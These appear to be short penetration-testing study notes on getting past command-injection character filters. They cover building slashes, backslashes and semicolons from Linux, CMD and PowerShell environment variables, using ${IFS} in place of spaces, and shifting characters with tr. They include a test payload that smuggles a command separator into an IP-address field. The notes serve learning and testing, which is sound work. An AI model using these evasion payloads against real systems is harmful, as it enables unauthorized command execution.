Very common blacklisted character: / or \ (since it specifies directories)

## Linux
Use Linux Environment Variables: ${IFS} from:
```
printenv
```

**Forwardslash (/)
If we do this:
```
echo ${PATH}
```
- This prints out: /usr/local/bin:/usr/bin:/bin:/usr/games

So, if we use the Linux Environment Variable, like this:
```
echo ${PATH:0:1}
```
- It prints out /
- Start at 0th character and take a string length of 1

**Semi-colon (;)
```
${LS_COLORS:10:1}
```

Test payload:
```
127.0.0.1${LS_COLORS:10:1}${IFS}
```
- Success


## Windows CMD
To do the same thing, echo a Windows variable, specify starting position, and negative end position

**Backslash (/)
```
echo %HOMEPATH:~6,-11%
```


## Windows PowerShell
```
Get-ChildItem Env:
```

**Backslash (\)
```
$env:HOMEPATH[0]
```


## Character Shifting

**Backslash (\)
```
man ascii
echo $(tr '!-}' '"-~'<<<[)
```
- [ has ascii #91, so one shift to the right is \
